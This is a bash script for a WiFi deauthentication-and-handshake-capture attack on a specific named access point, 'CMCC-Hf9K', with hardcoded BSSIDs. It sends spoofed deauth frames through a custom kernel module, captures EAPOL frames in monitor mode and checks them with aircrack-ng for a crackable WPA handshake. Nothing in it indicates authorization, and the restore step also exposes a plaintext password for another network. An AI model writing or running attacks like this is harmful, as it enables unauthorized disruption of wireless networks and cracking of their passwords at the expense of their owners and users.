#!/bin/bash
# capture_handshake.sh - Deauth + Capture cycle for CMCC-Hf9K
# Rapidly alternates between STA mode (deauth via petx5) and monitor mode (capture)
#
# Usage: sudo bash /tmp/capture_handshake.sh [rounds]

ROUNDS=${1:-5}
TARGET_BSSID_24="86:1A:24:58:59:1C"
TARGET_BSSID_5G="86:1A:24:5C:59:1C"
FREQ=2437   # Channel 6 (2.4GHz)
PCAP="/tmp/hs_capture.pcap"
DRIVER="/tmp/qca_cld3_wlan.ko"

echo "[*] CMCC-Hf9K Handshake Capture"
echo "[*] Target: $TARGET_BSSID_24 (ch6, $FREQ MHz)"
echo "[*] Rounds: $ROUNDS"

# Ensure petx5 is built
cd /tmp
[ -f petx5.ko ] || { as -o petx5.o petx5.S && ld -r -o petx5.ko petx5.o; }

# Remove old capture
rm -f "$PCAP" /tmp/hs_*.pcap

for round in $(seq 1 $ROUNDS); do
    echo ""
    echo "[Round $round/$ROUNDS] === DEAUTH PHASE ==="

    # Kill everything
    killall wpa_supplicant 2>/dev/null
    killall airodump-ng tcpdump 2>/dev/null
    systemctl stop NetworkManager 2>/dev/null

    # Reload in STA mode
    rmmod wlan 2>/dev/null
    sleep 2
    insmod "$DRIVER"
    sleep 4

    # Connect to target AP
    echo -n "[*] Connecting to CMCC-Hf9K... "

    CONN_BEFORE=$(dmesg | grep -c "connected to ${TARGET_BSSID_24}\|connected to ${TARGET_BSSID_5G}")

    # Use nmcli with dummy password
    systemctl start NetworkManager 2>/dev/null
    sleep 1
    nmcli device wifi connect "$TARGET_BSSID_24" password "dummypassword12345678" ifname wlan0 2>/dev/null &
    PID=$!

    # Wait for connection
    OK=0
    for i in $(seq 1 80); do
        CONN_NOW=$(dmesg | grep -c "connected to 86:1a:24:5[8c]:59:1c")
        if [ "$CONN_NOW" -gt "$CONN_BEFORE" ]; then
            OK=1
            break
        fi
        sleep 0.05
    done

    if [ $OK -eq 0 ]; then
        echo "FAIL"
        kill $PID 2>/dev/null
        continue
    fi
    echo "OK"

    # Send spoofed deauths via petx5 (3 bursts)
    echo -n "[*] Sending deauths... "
    SENT=0
    for b in 1 2 3; do
        rmmod kfind 2>/dev/null
        sleep 0.05
        insmod /tmp/petx5.ko 2>/dev/null
        if [ $? -eq 0 ]; then
            SENT=$((SENT + 1))
            rmmod kfind 2>/dev/null
            sleep 0.1
        fi
    done
    echo "$SENT sent"

    # Kill connection
    kill $PID 2>/dev/null; wait $PID 2>/dev/null
    systemctl stop NetworkManager 2>/dev/null
    killall wpa_supplicant 2>/dev/null

    echo "[Round $round/$ROUNDS] === CAPTURE PHASE ==="

    # Quickly switch to monitor mode
    rmmod wlan 2>/dev/null
    sleep 2
    insmod "$DRIVER" con_mode_monitor=4
    sleep 3
    ip link set wlan0 up
    iw dev wlan0 set freq $FREQ

    # Capture for 30 seconds
    echo "[*] Capturing on $FREQ MHz for 30 seconds..."
    timeout 30 tcpdump -i wlan0 -w /tmp/hs_round${round}.pcap 2>/dev/null

    # Check for EAPOL
    EAPOL=$(tcpdump -r /tmp/hs_round${round}.pcap 2>/dev/null | grep -ci "EAPOL\|802.1X\|Key ")
    echo "[*] Round $round: $EAPOL EAPOL frames captured"

    if [ $EAPOL -gt 0 ]; then
        echo "[!] EAPOL frames found! Checking for handshake..."
        # Merge captures
        mergecap -w "$PCAP" /tmp/hs_round*.pcap 2>/dev/null || cp /tmp/hs_round${round}.pcap "$PCAP"
        aircrack-ng "$PCAP" 2>&1 | head -15
    fi
done

# Merge all captures
echo ""
echo "[*] Merging all captures..."
mergecap -w "$PCAP" /tmp/hs_round*.pcap 2>/dev/null
ls -la "$PCAP" 2>/dev/null
echo "[*] Checking for handshake..."
aircrack-ng "$PCAP" 2>&1 | head -20

# Restore connectivity
echo "[*] Restoring WiFi..."
rmmod wlan 2>/dev/null
sleep 2
insmod "$DRIVER"
sleep 4
systemctl start NetworkManager 2>/dev/null
sleep 2
nmcli device wifi connect 8C:DE:F9:B3:9E:20 password 9006609b29404a ifname wlan0 2>/dev/null

echo "[*] Done."
